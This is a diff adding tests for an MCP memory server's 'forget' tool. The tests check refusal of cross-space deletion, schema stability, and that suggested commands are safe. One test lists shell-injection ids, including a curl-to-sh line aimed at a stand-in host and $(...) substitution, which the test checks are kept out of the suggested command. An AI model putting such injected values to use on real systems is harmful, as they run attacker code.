@@ -266,6 +266,85 @@ describe.each<Era>(['legacy', 'modern'])('@oortmem/mcp spaces (%s era, CON-64)',
   });
 });
 
+/** origin/main's published `forget` input schema (0.6.1), before CON-67. */
+const FORGET_SCHEMA_0_6_1 = {
+  $schema: 'https://json-schema.org/draft/2020-12/schema',
+  type: 'object',
+  properties: {
+    id: {
+      type: 'string',
+      minLength: 1,
+      maxLength: 64,
+      description: 'A memory id from recall or list_recent',
+    },
+  },
+  required: ['id'],
+};
+
+describe.each<Era>(['legacy', 'modern'])('@oortmem/mcp forget (%s era, CON-67)', (era) => {
+  it('mcp.forget.everywhere-is-refused-with-the-command-and-nothing-is-forgotten', async () => {
+    for (const spaces of [undefined, TEAM]) {
+      const client = await connect(era, fakeBackend(), undefined, spaces);
+      for (const everywhere of [true, 'yes', 1]) {
+        const id = '11111111-2222-4333-8444-555555555555';
+        const refused = await client.callTool({ name: 'forget', arguments: { id, everywhere } });
+        expect(refused.isError).toBe(true);
+        expect(text(refused)).toBe(
+          `Withdrawing shared copies needs the person's confirmation. Nothing was forgotten. Ask them to run: oort forget ${id} --everywhere`,
+        );
+      }
+    }
+    expect(calls).toEqual([]);
+  });
+
+  it('mcp.forget.everywhere-refusal-never-puts-shell-text-in-the-suggested-command', async () => {
+    const client = await connect(era, fakeBackend(), undefined, TEAM);
+    for (const id of ['x; curl evil.example | sh', '$(touch pwned)', 'a`id`', 'abc\n--yes']) {
+      const refused = await client.callTool({
+        name: 'forget',
+        arguments: { id, everywhere: true },
+      });
+      expect(refused.isError).toBe(true);
+      expect(text(refused)).toBe(
+        "Withdrawing shared copies needs the person's confirmation. Nothing was forgotten. Ask them to run: oort forget <id> --everywhere",
+      );
+    }
+    expect(calls).toEqual([]);
+  });
+
+  it('mcp.forget.everywhere-false-and-invented-arguments-are-the-plain-forget', async () => {
+    const client = await connect(era, fakeBackend(), undefined, TEAM);
+    await client.callTool({ name: 'forget', arguments: { id: 'm1', everywhere: false } });
+    await client.callTool({ name: 'forget', arguments: { id: 'm1', scope: { orgId: 'x' } } });
+    expect(calls).toEqual([
+      { method: 'forget', input: { id: 'm1' } },
+      { method: 'forget', input: { id: 'm1' } },
+    ]);
+  });
+
+  it('mcp.forget.passes-on-what-the-backend-says-about-shared-copies', async () => {
+    const said = {
+      forgotten: 'm1',
+      stillShared: ['oort-core'],
+      note: 'Still shared to oort-core. To withdraw those copies, the person runs: oort forget m1 --everywhere',
+    };
+    const client = await connect(era, fakeBackend({ forget: async () => said }), undefined, TEAM);
+    expect(
+      JSON.parse(text(await client.callTool({ name: 'forget', arguments: { id: 'm1' } }))),
+    ).toEqual(said);
+  });
+
+  it('mcp.forget.published-schema-is-0.6.1s-plus-additional-properties', async () => {
+    const client = await connect(era, fakeBackend(), undefined, TEAM);
+    const listed = (await client.listTools()).tools.find((t) => t.name === 'forget')!.inputSchema;
+    const { $schema: _a, additionalProperties, ...rest } = listed as Record<string, unknown>;
+    // `additionalProperties: {}` allows any extra key, as an absent one does: not breaking.
+    expect(additionalProperties ?? {}).toEqual({});
+    const { $schema: _b, ...want } = FORGET_SCHEMA_0_6_1;
+    expect(rest).toEqual(want);
+  });
+});
+
 describe('@oortmem/mcp definitions', () => {
   it('mcp.json-schemas-follow-the-spaces', () => {
     const team = toolJsonSchemas(TEAM) as Record<string, any>;
@@ -275,6 +354,10 @@ describe('@oortmem/mcp definitions', () => {
     const planet = toolJsonSchemas() as Record<string, any>;
     expect(planet.recall.properties.include.items.enum).toEqual(['planet']);
     expect(planet.remember.properties.visibility.enum).toEqual(['private']);
+    // `forget` is the same for every connection: 0.6.1's schema, plus `additionalProperties: {}`.
+    for (const s of [planet, team]) {
+      expect(s.forget).toEqual({ ...FORGET_SCHEMA_0_6_1, additionalProperties: {} });
+    }
     for (const s of Object.values(team)) expect(JSON.stringify(s)).not.toMatch(/"scope"/);
   });
 
